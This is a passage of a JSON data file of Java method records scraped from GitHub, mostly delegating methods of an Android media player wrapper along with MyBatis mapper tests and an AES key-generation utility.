sqlSessionFactory.openSession()) {      Mapper mapper = sqlSession.getMapper(Mapper.class);      User user = mapper.getUserByNameConstructor(\"User2\");      assertEquals(Integer.valueOf(2), user.getId());      assertEquals(\"User2\", user.getName());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/results_id/ResultsIdTest.java", "stars": "15", "class": {"name": "ResultsIdTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReuseNamedResultsFromAnotherMapper", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testReuseNamedResultsFromAnotherMapper() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      AnotherMapper mapper = sqlSession.getMapper(AnotherMapper.class);      List<User> users = mapper.getUsers();      assertEquals(2, users.size());      assertEquals(Integer.valueOf(1), users.get(0).getId());      assertEquals(\"User1\", users.get(0).getName());      assertEquals(Integer.valueOf(2), users.get(1).getId());      assertEquals(\"User2\", users.get(1).getName());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/results_id/ResultsIdTest.java", "stars": "15", "class": {"name": "ResultsIdTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReuseNamedResultsFromXmlMapper", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testReuseNamedResultsFromXmlMapper() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      AnotherMapper mapper = sqlSession.getMapper(AnotherMapper.class);      User user = mapper.getUser(1);      assertEquals(Integer.valueOf(1), user.getId());      assertEquals(\"User1\", user.getName());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/results_id/ResultsIdTest.java", "stars": "15", "class": {"name": "ResultsIdTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "getInternalMediaPlayer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "MediaPlayer", "snippet": "    public MediaPlayer getInternalMediaPlayer() {        return mInternalMediaPlayer;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "setDisplay", "params": ["SurfaceHolder"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDisplay(SurfaceHolder sh) {        synchronized (mInitLock) {            if (!mIsReleased) {                mInternalMediaPlayer.setDisplay(sh);            }        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "setSurface", "params": ["Surface"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSurface(Surface surface) {        mInternalMediaPlayer.setSurface(surface);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "setDataSource", "params": ["Context", "Uri"], "throws": ["IOException", "IllegalArgumentException", "SecurityException", "IllegalStateException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDataSource(Context context, Uri uri)            throws IOException, IllegalArgumentException, SecurityException, IllegalStateException {        mInternalMediaPlayer.setDataSource(context, uri);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "setDataSource", "params": ["Context", "Uri", "Map<String,String>"], "throws": ["IOException", "IllegalArgumentException", "SecurityException", "IllegalStateException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDataSource(Context context, Uri uri, Map<String, String> headers)            throws IOException, IllegalArgumentException, SecurityException, IllegalStateException {        mInternalMediaPlayer.setDataSource(context, uri, headers);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "setDataSource", "params": ["FileDescriptor"], "throws": ["IOException", "IllegalArgumentException", "IllegalStateException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDataSource(FileDescriptor fd)            throws IOException, IllegalArgumentException, IllegalStateException {        mInternalMediaPlayer.setDataSource(fd);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "setDataSource", "params": ["String"], "throws": ["IOException", "IllegalArgumentException", "SecurityException", "IllegalStateException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDataSource(String path) throws IOException,            IllegalArgumentException, SecurityException, IllegalStateException {        mDataSource = path;        Uri uri = Uri.parse(path);        String scheme = uri.getScheme();        if (!TextUtils.isEmpty(scheme) && scheme.equalsIgnoreCase(\"file\")) {            mInternalMediaPlayer.setDataSource(uri.getPath());        } else {            mInternalMediaPlayer.setDataSource(path);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "setDataSource", "params": ["IMediaDataSource"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDataSource(IMediaDataSource mediaDataSource) {        releaseMediaDataSource();        mMediaDataSource = new MediaDataSourceProxy(mediaDataSource);        mInternalMediaPlayer.setDataSource(mMediaDataSource);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getDataSource", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDataSource() {        return mDataSource;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "releaseMediaDataSource", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void releaseMediaDataSource() {        if (mMediaDataSource != null) {            try {                mMediaDataSource.close();            } catch (IOException e) {                e.printStackTrace();            }            mMediaDataSource = null;        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "prepareAsync", "params": [], "throws": ["IllegalStateException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void prepareAsync() throws IllegalStateException {        mInternalMediaPlayer.prepareAsync();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "start", "params": [], "throws": ["IllegalStateException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void start() throws IllegalStateException {        mInternalMediaPlayer.start();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "stop", "params": [], "throws": ["IllegalStateException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void stop() throws IllegalStateException {        mInternalMediaPlayer.stop();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "pause", "params": [], "throws": ["IllegalStateException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void pause() throws IllegalStateException {        mInternalMediaPlayer.pause();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "setScreenOnWhilePlaying", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setScreenOnWhilePlaying(boolean screenOn) {        mInternalMediaPlayer.setScreenOnWhilePlaying(screenOn);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getTrackInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ITrackInfo", "snippet": "    public ITrackInfo[] getTrackInfo() {        return AndroidTrackInfo.fromMediaPlayer(mInternalMediaPlayer);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getVideoWidth", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getVideoWidth() {        return mInternalMediaPlayer.getVideoWidth();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getVideoHeight", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getVideoHeight() {        return mInternalMediaPlayer.getVideoHeight();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getVideoSarNum", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getVideoSarNum() {        return 1;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getVideoSarDen", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getVideoSarDen() {        return 1;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "isPlaying", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isPlaying() {        try {            return mInternalMediaPlayer.isPlaying();        } catch (IllegalStateException e) {            DebugLog.printStackTrace(e);            return false;        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "seekTo", "params": ["long"], "throws": ["IllegalStateException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void seekTo(long msec) throws IllegalStateException {        mInternalMediaPlayer.seekTo((int) msec);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getCurrentPosition", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getCurrentPosition() {        try {            return mInternalMediaPlayer.getCurrentPosition();        } catch (IllegalStateException e) {            DebugLog.printStackTrace(e);            return 0;        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getDuration", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getDuration() {        try {            return mInternalMediaPlayer.getDuration();        } catch (IllegalStateException e) {            DebugLog.printStackTrace(e);            return 0;        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "release", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void release() {        mIsReleased = true;        mInternalMediaPlayer.release();        releaseMediaDataSource();        resetListeners();        attachInternalListeners();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "reset", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void reset() {        try {            mInternalMediaPlayer.reset();        } catch (IllegalStateException e) {            DebugLog.printStackTrace(e);        }        releaseMediaDataSource();        resetListeners();        attachInternalListeners();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "setLooping", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLooping(boolean looping) {        mInternalMediaPlayer.setLooping(looping);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "isLooping", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isLooping() {        return mInternalMediaPlayer.isLooping();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "setVolume", "params": ["float", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setVolume(float leftVolume, float rightVolume) {        mInternalMediaPlayer.setVolume(leftVolume, rightVolume);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getAudioSessionId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getAudioSessionId() {        return mInternalMediaPlayer.getAudioSessionId();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getMediaInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "MediaInfo", "snippet": "    public MediaInfo getMediaInfo() {        if (sMediaInfo == null) {            MediaInfo module = new MediaInfo();            module.mVideoDecoder = \"android\";            module.mVideoDecoderImpl = \"HW\";            module.mAudioDecoder = \"android\";            module.mAudioDecoderImpl = \"HW\";            sMediaInfo = module;        }        return sMediaInfo;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "setLogEnabled", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLogEnabled(boolean enable) {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "isPlayable", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isPlayable() {        return true;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "setWakeMode", "params": ["Context", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setWakeMode(Context context, int mode) {        mInternalMediaPlayer.setWakeMode(context, mode);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "setAudioStreamType", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAudioStreamType(int streamtype) {        mInternalMediaPlayer.setAudioStreamType(streamtype);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "setKeepInBackground", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setKeepInBackground(boolean keepInBackground) {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "attachInternalListeners", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void attachInternalListeners() {        mInternalMediaPlayer.setOnPreparedListener(mInternalListenerAdapter);        mInternalMediaPlayer                .setOnBufferingUpdateListener(mInternalListenerAdapter);        mInternalMediaPlayer.setOnCompletionListener(mInternalListenerAdapter);        mInternalMediaPlayer                .setOnSeekCompleteListener(mInternalListenerAdapter);        mInternalMediaPlayer                .setOnVideoSizeChangedListener(mInternalListenerAdapter);        mInternalMediaPlayer.setOnErrorListener(mInternalListenerAdapter);        mInternalMediaPlayer.setOnInfoListener(mInternalListenerAdapter);        mInternalMediaPlayer.setOnTimedTextListener(mInternalListenerAdapter);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayer", "extends": "AbstractMediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "readAt", "params": ["long", "byte", "int", "int"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "int", "snippet": "        public int readAt(long position, byte[] buffer, int offset, int size) throws IOException {            return mMediaDataSource.readAt(position, buffer, offset, size);        }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "MediaDataSourceProxy", "extends": "MediaDataSource", "implements": null, "modifiers": ["private", "static"]}}, {"method_name": "getSize", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "long", "snippet": "        public long getSize() throws IOException {            return mMediaDataSource.getSize();        }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "MediaDataSourceProxy", "extends": "MediaDataSource", "implements": null, "modifiers": ["private", "static"]}}, {"method_name": "close", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "        public void close() throws IOException {            mMediaDataSource.close();        }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "MediaDataSourceProxy", "extends": "MediaDataSource", "implements": null, "modifiers": ["private", "static"]}}, {"method_name": "onInfo", "params": ["MediaPlayer", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean onInfo(MediaPlayer mp, int what, int extra) {            AndroidMediaPlayer self = mWeakMediaPlayer.get();            return self != null && notifyOnInfo(what, extra);        }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayerListenerHolder", "extends": null, "implements": ["MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer"], "modifiers": ["private"]}}, {"method_name": "onError", "params": ["MediaPlayer", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean onError(MediaPlayer mp, int what, int extra) {            AndroidMediaPlayer self = mWeakMediaPlayer.get();            return self != null && notifyOnError(what, extra);        }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayerListenerHolder", "extends": null, "implements": ["MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer"], "modifiers": ["private"]}}, {"method_name": "onVideoSizeChanged", "params": ["MediaPlayer", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onVideoSizeChanged(MediaPlayer mp, int width, int height) {            AndroidMediaPlayer self = mWeakMediaPlayer.get();            if (self == null)                return;            notifyOnVideoSizeChanged(width, height, 1, 1);        }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayerListenerHolder", "extends": null, "implements": ["MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer"], "modifiers": ["private"]}}, {"method_name": "onSeekComplete", "params": ["MediaPlayer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onSeekComplete(MediaPlayer mp) {            AndroidMediaPlayer self = mWeakMediaPlayer.get();            if (self == null)                return;            notifyOnSeekComplete();        }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayerListenerHolder", "extends": null, "implements": ["MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer"], "modifiers": ["private"]}}, {"method_name": "onBufferingUpdate", "params": ["MediaPlayer", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onBufferingUpdate(MediaPlayer mp, int percent) {            AndroidMediaPlayer self = mWeakMediaPlayer.get();            if (self == null)                return;            notifyOnBufferingUpdate(percent);        }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayerListenerHolder", "extends": null, "implements": ["MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer"], "modifiers": ["private"]}}, {"method_name": "onCompletion", "params": ["MediaPlayer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onCompletion(MediaPlayer mp) {            AndroidMediaPlayer self = mWeakMediaPlayer.get();            if (self == null)                return;            notifyOnCompletion();        }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayerListenerHolder", "extends": null, "implements": ["MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer"], "modifiers": ["private"]}}, {"method_name": "onPrepared", "params": ["MediaPlayer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onPrepared(MediaPlayer mp) {            AndroidMediaPlayer self = mWeakMediaPlayer.get();            if (self == null)                return;            notifyOnPrepared();        }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayerListenerHolder", "extends": null, "implements": ["MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer"], "modifiers": ["private"]}}, {"method_name": "onTimedText", "params": ["MediaPlayer", "TimedText"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onTimedText(MediaPlayer mp, TimedText text) {            AndroidMediaPlayer self = mWeakMediaPlayer.get();            if (self == null)                return;            IjkTimedText ijkText = null;            if (text != null) {                ijkText = new IjkTimedText(text.getBounds(), text.getText());            }            notifyOnTimedText(ijkText);        }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/AndroidMediaPlayer.java", "stars": "2", "class": {"name": "AndroidMediaPlayerListenerHolder", "extends": null, "implements": ["MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer", "MediaPlayer"], "modifiers": ["private"]}}, {"method_name": "generateKey", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "byte", "snippet": "    public static byte[] generateKey(){        KeyGenerator generator = null;        try {            generator = KeyGenerator.getInstance(\"AES\");        } catch (NoSuchAlgorithmException e) {            throw new RuntimeException(e.getMessage(), e);        }        generator.init(128);        SecretKey secretKey = generator.generateKey();        return secretKey.getEncoded();    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/util/AESUtils.java", "stars": "23", "class": {"name": "AESUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "generateKey", 